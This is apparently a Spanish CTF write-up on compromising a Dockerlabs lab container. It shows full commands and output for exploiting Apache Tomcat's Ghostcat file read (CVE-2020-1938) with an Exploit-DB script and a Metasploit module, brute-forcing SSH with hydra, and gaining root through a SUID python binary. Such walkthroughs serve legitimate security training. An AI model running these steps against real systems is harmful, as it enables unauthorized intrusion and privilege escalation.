

DIFICULTAD: EASY

ENLACE:  [Dockerlabs](https://dockerlabs.es/)

![image](https://github.com/danielhidalgo2/WriteUps/assets/60622651/3c1a28fd-bbaf-4f88-bec8-cb6701cbe610)

## RECONOCIMIENTO
Una vez despleguemos la máquina comprobaremos si tenemos conectividad con ella enviando un paquete ICMP a la IP

```shell-session
ping -c1 172.17.0.2 
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.075 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.075/0.075/0.075/0.000 ms
```

Como vemos, tenemos conectividad a la máquina y en base al TTL intuimos que es una máquina Linux.
Para este tipo de máquinas suelo tirar el mismo escaneo:
```shell-session
sudo nmap -p- --open -sS -sCV --min-rate 5000 -Pn -n 172.17.0.2  -vvv 
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4d:8d:56:7f:47:95:da:d9:a4:bb:bc:3e:f1:56:93:d5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDJi0a0gTTZC2nVNkPjJedCdXEeEYnMU3E4m8jXRL6691mf3z0BKPh2ODBCksLWp1/14hWAHVuieWzNbWwWtnhmjW6YkGyfH5mYrmDtnrWqcAkVGgb/d/zK9VKSM2XPEFNCRN3xwieLDpYzMsxjU6dDSlGu9xYMQzBuKX5xxuosmvRQvkRu68RAlkT+jt4Wgb0vLpFHDHspy9f169WXJBy903TMHmgTLmg3SHb/QcRvNge4auUzjsRBX3Lib90FU7YfgRYworGHhAcsUX26I5kn9ymQ2/NYvDXl61vbFDCrjppf2/22B4Xj/Ussu0+MobmTFKmqHqm2K/Lh+p88sXu/
|   256 8d:82:e6:7d:fb:1c:08:89:06:11:5b:fd:a8:08:1e:72 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO/++1RlDUy5L2ugoGoHz/zfvPPdwSZjabzCi8ArUAiVg62Uinj0iO7q8MbjNFHuBj5c4Kj+uroM8KuZoEhi53w=
|   256 1e:eb:63:bd:b9:87:72:43:49:6c:76:e1:45:69:ca:75 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIApEpyRx1JVtGnB10BAEBE7uiZbusXQIDieBTOtM3dp7
8009/tcp open  ajp13   syn-ack ttl 64 Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http    syn-ack ttl 64 Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/9.0.30
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Tenemos los puertos 22, 8009 y 8080, de este último nos muestra una versión de Apache Tomcat 9.0.30.

## EXPLOTACION

Encontramos una vulnerabilidad relacionada con esa versión y el puerto 8009 con el servicio ajp  "Apache Tomcat AJP Arbitrary File Read / Include Vulnerability（CVE-2020-1938"
Vamos a echar un vistazo con searchsploit:

![image](https://github.com/danielhidalgo2/WriteUps/assets/60622651/8c9171e4-96ee-4ace-8677-f4479a865f76)

En efecto, hay una vulnerabilidad conocida también como "Ghostcat" para leer archivos, la podemos explotar de forma manual o con un módulo de metasploit.

![image](https://github.com/danielhidalgo2/WriteUps/assets/60622651/8ca978d2-7db0-4b62-af83-6eeff4c5e082)

Con el mismo searchsploit podemos copiarnos el payload.


```shell-session
┌──(daniel㉿kali)-[~]
└─$ searchsploit -m multiple/webapps/48143.py

  Exploit: Apache Tomcat - AJP 'Ghostcat File Read/Inclusion
      URL: https://www.exploit-db.com/exploits/48143
     Path: /usr/share/exploitdb/exploits/multiple/webapps/48143.py
    Codes: CVE-2020-1938
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/daniel/48143.py

```

Con python especificando el puerto y la ip podemos explotarlo de la siguiente manera:

```shell-session

┌──(daniel㉿kali)-[~]
└─$ python2 48143.py -p 8009 172.17.0.2
Getting resource at ajp13://172.17.0.2:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat, Jerry ;)
  </description>

</web-app>


```

Esto nos da la pista de que hemos podido enumerar un posible usuario, jerry. Para comprobarlo haremos un ataque de fuerza bruta con hydra a través del servicio ssh.

```shell-session
┌──(daniel㉿kali)-[~]
└─$ hydra -l jerry -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64 -V 
[ATTEMPT] target 172.17.0.2 - login "jerry" - pass "tinkerbell" - 63 of 14344399 [child 62] (0/0)
[ATTEMPT] target 172.17.0.2 - login "jerry" - pass "charlie" - 64 of 14344399 [child 63] (0/0)
[22][ssh] host: 172.17.0.2   login: jerry   password: chocolate

```
Nos da la contraseña chocolate para el usuario jerry.

```shell-session
┌──(daniel㉿kali)-[~]
└─$ ssh jerry@172.17.0.2                     
jerry@172.17.0.2's password: 
Linux 8a81b1323077 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.15-2kali1 (2024-04-09) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 14 12:34:24 2024 from 172.17.0.1
jerry@8a81b1323077:~$ 

```

Ya tenemos acceso al usuario jerry, ahora tenemos que buscar la manera de escalar privilegios para ser root.

## ESCALADA DE PRIVILEGIOS

Buscando por archivos con permisos SUID en el sistema, encontramos por ejemplo python, con el cual intentaremos escalar privilegios:


```shell-session
jerry@8a81b1323077:~$ find / -perm -4000 2>/dev/null
/bin/mount
/bin/umount
/bin/su
/bin/ping
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/perl5.28.1
/usr/bin/perl
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/python3.7
/usr/bin/python3.7m
```

Con una breve búsqueda en GTFOBINS encontramos la manera de escalar privilegios con python:


```shell-session
jerry@8a81b1323077:~$ /usr/bin/python3.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
root
# 
```

## EXPLOTACION CON METASPLOIT

Buscamos el exploit "Ghostcat"


```shell-session
┌──(daniel㉿kali)-[~]
└─$ msfconsole -q
msf6 > search ghostcat

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  auxiliary/admin/http/tomcat_ghostcat  2020-02-20       normal  Yes    Apache Tomcat AJP File Read


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/http/tomcat_ghostcat
```

Simplemente deberemos modificar el ip target que vamos a atacar:

```shell-session
msf6 > use 0
msf6 auxiliary(admin/http/tomcat_ghostcat) > show options

Module options (auxiliary/admin/http/tomcat_ghostcat):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   FILENAME  /WEB-INF/web.xml  yes       File name
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     8009              yes       The Apache JServ Protocol (AJP) port (TCP)


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS 172.17.0.2
RHOSTS => 172.17.0.2
```

Después de esto solo nos quedará ejecutarlo y...

```shell-session
msf6 auxiliary(admin/http/tomcat_ghostcat) > run
[*] Running module against 172.17.0.2
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat, Jerry ;)
  </description>

</web-app>

[+] 172.17.0.2:8009 - File contents save to: /home/daniel/.msf4/loot/20240514160852_default_172.17.0.2_WEBINFweb.xml_771593.txt
[*] Auxiliary module execution completed

```